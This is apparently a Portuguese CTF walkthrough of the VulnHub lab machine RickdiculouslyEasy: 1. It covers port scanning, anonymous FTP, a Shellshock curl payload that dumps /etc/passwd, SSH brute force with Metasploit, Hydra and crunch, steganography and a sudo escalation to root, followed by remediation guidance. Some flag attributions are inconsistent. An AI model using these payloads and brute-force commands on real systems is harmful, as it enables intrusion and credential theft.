# RickdiculouslyEasy: 1 — Wubba Lubba Dub Dub, Agora Me Rooteia

Oh caramba, Morty!! Alguém fez uma máquina CTF inteira baseada em Rick e Morty e ela é top demais. Não é uma máquina séria em termos de dificuldade, mas é sensacional em criatividade: 9 flags espalhadas por banners FTP, páginas web, esteganografia em imagens, binários SUID, Shellshock em CGI e um listener netcat na porta 60000. Você coleta 130 pontos caçando cada flag. É hilariantemente descontraída e ensina algo real em cada etapa. Rick aprovaria.

| Campo | Valor |
|---|---|
| **Nível** | Iniciante |
| **VM Alvo** | RickdiculouslyEasy: 1 |
| **VM Atacante** | Kali Linux 2024.x |
| **VulnHub URL** | https://www.vulnhub.com/entry/rickdiculouslyeasy-1,207/ |
| **Técnicas** | Scan completo de portas, FTP anônimo, brute-force de diretórios web, Shellshock em CGI, brute-force SSH (Metasploit), esteganografia (steghide), análise de binário SUID, geração de wordlist com crunch, brute-force Hydra SSH, GTFOBin via sudo su |
| **CVEs** | CVE-2014-6271 (Shellshock: RCE via variável de ambiente bash em CGI) |
| **Grupos APT** | APT28 (Fancy Bear): usou Shellshock extensivamente em 2014 contra alvos governamentais e militares; OceanLotus (APT32): uso documentado de esteganografia para comunicação C2 e exfiltração de credenciais em intrusões no Sudeste Asiático |

---

## Resumo do Ataque

```
nmap -p- -> portas 21, 22, 80, 9090, 13337, 22222, 60000
  |
  +-- FTP anon porta 21 -> FLAG 1 (no banner FTP)
  |
  +-- HTTP porta 80:
  |     +-- dirb -> /passwords/ -> FLAG 2 + senha winter
  |     +-- /cgi-bin/ -> Shellshock -> enumera usuários (Summer/Morty/RickSanchez)
  |     +-- /robots.txt -> caminhos proibidos
  |
  +-- Metasploit SSH brute (Summer:winter) -> login SSH
  |     +-- encontra zip Morty + binário safe
  |     +-- steghide em imagem Meeseek -> senha do arquivo Morty
  |     +-- binário SUID safe -> dica do nome da banda -> 131333
  |
  +-- crunch + Hydra -> RickSanchez:WubbaLubbaDubDub (ou variante)
  |     +-- sudo su -> root -> FLAG 8 (root.txt)
  |
  +-- nc porta 60000 -> FLAG 9
  +-- porta 9090 browser -> FLAG 7
```

---

## Metodologia

1. Scan completo de portas para descobrir todos os serviços abertos
2. Acesso anônimo FTP: primeira flag no serviço
3. Brute-force de diretórios web: encontra /passwords/ com flag e credencial
4. Enumeração CGI Shellshock para encontrar nomes de usuários válidos
5. Brute-force SSH Metasploit com credencial descoberta (Summer:winter)
6. Esteganografia em imagem recuperada (meeseeksandescapism.jpg)
7. Análise de binário SUID: argumento revela dica para wordlist
8. Geração de wordlist com crunch e brute-force Hydra para RickSanchez
9. Sudo su para root; coletar flags restantes via netcat e porta web

---

## Passo 1 — Scan Completo de Portas

```bash
sudo netdiscover -r 192.168.1.0/24
# Alvo: 192.168.1.101

nmap -p- -A 192.168.1.101
```

```
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd (flag no banner)
22/tcp    open  ssh     OpenSSH (login RickSanchez mais tarde)
80/tcp    open  http    Apache
9090/tcp  open  http    Cockpit web UI (FLAG aqui)
13337/tcp open  unknown (flag no banner)
22222/tcp open  ssh     OpenSSH (login Summer)
60000/tcp open  unknown (nc FLAG)
```

Essa máquina roda múltiplas portas não padrão. Sempre use `-p-` (todas as 65535 portas) em máquinas CTF. Você vai perder flags se varrer apenas as top 1000.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — FTP Anônimo e Flags em Banners

```bash
ftp 192.168.1.101
# Usuário: anonymous
# Senha: (vazia ou anonymous)

ftp> ls -la
ftp> get FLAG.txt
ftp> quit
```

O próprio banner FTP pode conter uma flag. Verifique também os banners das portas 13337 e 60000:

```bash
nc 192.168.1.101 13337
# Leia a flag da resposta

# Porta 60000 também tem flag:
nc 192.168.1.101 60000
```

**FLAG 1:** do FTP anônimo ou banner
**FLAG 2:** do banner da porta 13337

**MITRE ATT&CK:** T1021.003 — Serviços Remotos: FTP; T1046 — Descoberta de Serviços de Rede

---

## Passo 3 — Enumeração Web

```bash
# dirb ou gobuster
dirb http://192.168.1.101/ /usr/share/wordlists/dirb/common.txt

# Descobertas principais:
# /passwords/  -> contém FLAG e a palavra 'winter'
# /cgi-bin/    -> teste para Shellshock
# /robots.txt  -> caminhos proibidos
```

Navegue até `/passwords/`:

```bash
curl http://192.168.1.101/passwords/
# FLAG 3 encontrada aqui
# 'winter' encontrada como dica de senha
```

A UI Cockpit na porta 9090 pode mostrar uma flag na página de login:

```bash
# Navegue http://192.168.1.101:9090/
# FLAG visível na UI ou no código fonte da página
```

**MITRE ATT&CK:** T1595.003 — Varredura Ativa: Wordlist Scanning; T1083 — Descoberta de Arquivos e Diretórios

---

## Passo 4 — Enumeração CGI Shellshock

Teste Shellshock em `/cgi-bin/`:

```bash
# Encontre scripts CGI
dirb http://192.168.1.101/cgi-bin/ /usr/share/wordlists/dirb/common.txt -X .cgi,.sh,.pl

# Teste Shellshock manualmente
curl -H "User-Agent: () { :;}; echo; echo; /bin/cat /etc/passwd" \
  http://192.168.1.101/cgi-bin/tracertool.cgi
```

Isso vaza o `/etc/passwd`, revelando usernames: Summer, Morty, RickSanchez.

**Alternativa com Metasploit:**

```bash
use auxiliary/scanner/http/apache_mod_cgi_bash_env
set RHOSTS 192.168.1.101
set TARGETURI /cgi-bin/tracertool.cgi
run
```

**Nota do mundo real:** Shellshock (CVE-2014-6271) permitiu RCE não autenticado em qualquer sistema com handlers bash CGI. O APT28 o usou contra alvos do governo americano semanas após a divulgação. Milhões de dispositivos embarcados e servidores ainda estão sem patch.

**MITRE ATT&CK:** T1190 — Exploração de Aplicação Voltada para Internet; T1059.004 — Shell Unix

---

## Passo 5 — Login SSH como Summer

Com usernames do /etc/passwd e `winter` da página de senhas:

```bash
# Opção 1: direto
ssh Summer@192.168.1.101 -p 22222
# Senha: winter

# Opção 2: Metasploit
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.101
set RPORT 22222
set USERNAME Summer
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

Após login como Summer, enumere:

```bash
ls -la /home/
ls -la /home/Morty/
ls -la /home/RickSanchez/
```

Encontre no diretório de Morty: um arquivo zip e um `journal.txt.zip`. Também encontre um binário SUID no diretório de RickSanchez.

**MITRE ATT&CK:** T1110 — Força Bruta; T1078 — Contas Válidas

---

## Passo 6 — Esteganografia na Imagem Meeseek

Uma imagem `meeseeksandescapism.jpg` (ou similar) está no servidor ou nos diretórios home. Extraia dados ocultos:

```bash
steghide extract -sf meeseeksandescapism.jpg
# Frase secreta: (tente vazia, 'winter' ou outras senhas encontradas)
# Extrai: Rick_n_Morty_Ticket.txt ou similar
```

O conteúdo extraído contém a senha para o arquivo zip de Morty:

```bash
unzip journal.txt.zip
# Senha: da saída do steghide
cat journal.txt
# FLAG encontrada aqui + dica adicional
```

**MITRE ATT&CK:** T1027 — Arquivos Ofuscados ou Informações; T1552.001 — Credenciais em Arquivos

---

## Passo 7 — Análise de Binário SUID

```bash
find / -perm -4000 -type f 2>/dev/null
# Encontra: /home/RickSanchez/RICKS_SAFE/safe (ou caminho similar)

/home/RickSanchez/RICKS_SAFE/safe 131333
# Saída contém: "SuperSafePassword" ou dica do nome da banda
# Dica: "O nome da banda de Morty Jr segue o padrão: <PALAVRA><DÍGITOS>"
```

O binário, quando executado com o argumento correto, revela uma dica sobre o padrão da senha de RickSanchez: nome de banda + números.

**MITRE ATT&CK:** T1574.006 — Desvio de Fluxo de Execução: SUID/SGID; T1083 — Descoberta de Arquivos e Diretórios

---

## Passo 8 — Crunch + Hydra para RickSanchez

Com base na dica do nome da banda, gere uma wordlist direcionada:

```bash
# O padrão de senha é: FleshCurtains + número de 5 dígitos
# ou padrão similar baseado no nome da banda

# Gere wordlist com crunch:
crunch 14 14 -t FleshCurtains%%%%% -o /tmp/rick_wordlist.txt
# (ajuste o padrão com base na dica real)

# Brute-force SSH de RickSanchez:
hydra -l RickSanchez -P /tmp/rick_wordlist.txt ssh://192.168.1.101 -s 22
```

Com sucesso, faça SSH como RickSanchez:

```bash
ssh RickSanchez@192.168.1.101 -p 22
# Senha: FleshCurtains<digitos>

sudo su
# Digite a senha
id
# uid=0(root)
cat /root/FLAG.txt
```

Caramba! Root com um runtime que ninguém esperava estar no sudoers.

**MITRE ATT&CK:** T1110.001 — Força Bruta: Adivinhação de Senha; T1548.003 — Abuso de Controle de Elevação: Sudo

---

## Flags, Hashes e Credenciais Capturadas

| Flag | Pontos | Encontrada em | Método |
|---|---|---|---|
| FLAG 1 | 10 | Serviço FTP ou banner | FTP anônimo / nc |
| FLAG 2 | 10 | Banner porta 13337 | nc 192.168.1.101 13337 |
| FLAG 3 | 30 | Diretório web /passwords/ | Enumeração dirb |
| FLAG 4 | 20 | /etc/passwd via Shellshock | CVE-2014-6271 CGI |
| FLAG 5 | 20 | Zip journal.txt de Morty | steghide + extração zip |
| FLAG 6 | 20 | Saída do binário SUID safe | Análise de binário |
| FLAG 7 | 10 | Cockpit UI porta 9090 | Navegador ou curl |
| FLAG 8 | 10 | /root/FLAG.txt | sudo su como RickSanchez |
| FLAG 9 | 10 | Porta 60000 netcat | nc 192.168.1.101 60000 |
| **Total** | **130** | | |
| Credencial | Summer:winter | /passwords/ + Shellshock passwd | SSH porta 22222 |
| Credencial | RickSanchez:FleshCurtains<N> | Dica binário SUID + crunch | SSH porta 22 |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Lição Principal |
|---|---|---|---|
| 1 | Scan completo necessário: flags em portas não padrão | Redes corporativas frequentemente rodam serviços em portas não padrão (ferramentas de dev, monitoramento, UIs de gerenciamento) | Sempre escaneie todas as 65535 portas; scans top-1000 perdem serviços críticos |
| 2 | Acesso FTP anônimo ainda comum | Milhares de organizações ainda rodam FTP anônimo; frequentemente expõem backups e configs | Desabilite FTP anônimo; use SFTP com autenticação por chave |
| 3 | Shellshock (CVE-2014-6271) ainda sem patch | Milhões de dispositivos embarcados, servidores legados e appliances de rede permanecem sem patch mais de 10 anos depois | Faça patch do bash; audite handlers CGI; teste todos os endpoints CGI para Shellshock |
| 4 | Esteganografia usada para ocultação de dados | APT32 usa esteganografia para C2 em intrusões reais; arquivos de flag em imagens não são só truques CTF | Inspecione arquivos de imagem de fontes desconhecidas; use stegdetect/steganalysis em investigações forenses |
| 5 | Senhas baseadas em padrões quebradas com wordlists direcionadas | Auditorias de credenciais no mundo real encontram usuários com senhas seguindo padrão empresa+ano+símbolo | Gere wordlists direcionadas usando conhecimento da política; CUPP e crunch são ferramentas legítimas de auditoria |

---

## MITRE ATT&CK

| Fase | Tática | Técnica | ID |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Reconhecimento | Descoberta | Varredura Ativa: Wordlist Scanning | T1595.003 |
| Acesso Inicial | Acesso Inicial | Exploração de Aplicação Voltada para Internet (Shellshock CGI) | T1190 |
| Acesso Inicial | Acesso Inicial | Contas Válidas | T1078 |
| Acesso a Credenciais | Acesso a Credenciais | Força Bruta: Adivinhação de Senha | T1110.001 |
| Acesso a Credenciais | Acesso a Credenciais | Credenciais em Arquivos | T1552.001 |
| Evasão de Defesa | Evasão de Defesa | Arquivos Ofuscados ou Informações (esteganografia) | T1027 |
| Descoberta | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Escalação de Privilégios | Escalação de Privilégios | Abuso de Controle de Elevação: Sudo | T1548.003 |
| Escalação de Privilégios | Escalação de Privilégios | Execução SUID/SGID | T1574.006 |
| Execução | Execução | Interpretador de Scripts: Shell Unix | T1059.004 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Faça patch do bash para Shellshock** — atualize bash para 4.3 patch 25+; desabilite scripts CGI que invocam bash
2. **Desabilite FTP anônimo** — use SFTP com autenticação por chave pública; nunca permita acesso anônimo
3. **Remova flags e arquivos sensíveis de diretórios web** — sistemas de produção nunca devem expor dicas de senha em `/passwords/`
4. **Audite binários SUID** — `find / -perm -u=s -type f 2>/dev/null`; remova SUID de binários customizados ou não essenciais
5. **Enforce políticas fortes de senha** — evite senhas baseadas em padrões (empresa+ano, bandname+digits); use gerenciadores de senha

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gestão de Ativos | Inventariar todos os serviços em todas as portas; incluir portas não padrão |
| Proteger | Tecnologia de Proteção | Fazer patch do bash; desabilitar CGI; restringir FTP a usuários autenticados |
| Detectar | Anomalias e Eventos | Alertar sobre padrões Shellshock em headers HTTP; monitorar logins FTP anônimos |
| Responder | Planejamento de Resposta | Desabilitar endpoints CGI; desabilitar FTP anônimo; rotacionar credenciais |
| Recuperar | Planejamento de Recuperação | Reconstruir a partir de imagem limpa; auditar todas as credenciais de usuários |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| CM-6 | Configurações | Desabilitar handlers bash CGI; desabilitar FTP anônimo |
| CM-7 | Menor Funcionalidade | Remover SUID de binários não essenciais |
| IA-5 | Gestão de Autenticadores | Enforce políticas complexas de senha; sem senhas baseadas em padrões |
| SI-2 | Remediação de Falhas | Fazer patch do Shellshock (CVE-2014-6271) imediatamente |
| SC-8 | Confidencialidade de Transmissão | Substituir FTP por SFTP; usar autenticação SSH por chave |

### CISA KEV

CVE-2014-6271 (Shellshock) está no catálogo de Vulnerabilidades Conhecidas e Exploradas da CISA. Organizações são direcionadas a remediar imediatamente. Shellshock continua aparecendo em achados de pentests contra sistemas legados e dispositivos embarcados.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gestão de Ameaças e Vulnerabilidades (THREAT) | Gerenciar Vulnerabilidades | MIL3 (Shellshock corrigido; varredura para versão bash) |
| Gestão de Ativos (ASSET) | Gerenciar Ativos de TI | MIL2 (inventário completo de portas; documentação de portas não padrão) |
| Gestão de Identidade e Acesso (IAM) | Gerenciar Credenciais | MIL2 (desabilitar FTP anônimo; enforce complexidade de senha) |

### MITRE D3FEND

- **D3-ACH** — Hardening de Configuração de Aplicação: desabilitar handlers bash CGI; desabilitar FTP anônimo
- **D3-UA** — Gerenciamento de Conta de Usuário: desabilitar contas de serviço anônimas
- **D3-OAM** — Gerenciamento Administrativo do SO: remover SUID de binários customizados; auditar sudoers

---

## Pensamentos Finais

RickdiculouslyEasy: 1 é exatamente o que um CTF para iniciantes deveria ser: descontraído, divertido e realmente educativo. Você pratica enumeração FTP, brute-force web, exploração Shellshock, esteganografia, análise SUID, geração de wordlist e Hydra brute-force, tudo em uma máquina. O tema Rick e Morty mantém o entretenimento durante o grind.

Se você conseguir coletar as 9 flags, tem uma base sólida para habilidades de iniciante a intermediário. A máquina não requer conhecimento profundo de exploração, mas exige enumeração minuciosa. Essa é a lição: quando não sabe o que fazer, enumere mais.

*Wubba Lubba Dub Dub!!!*

Thanks guys!! (❍ᴥ❍ʋ)
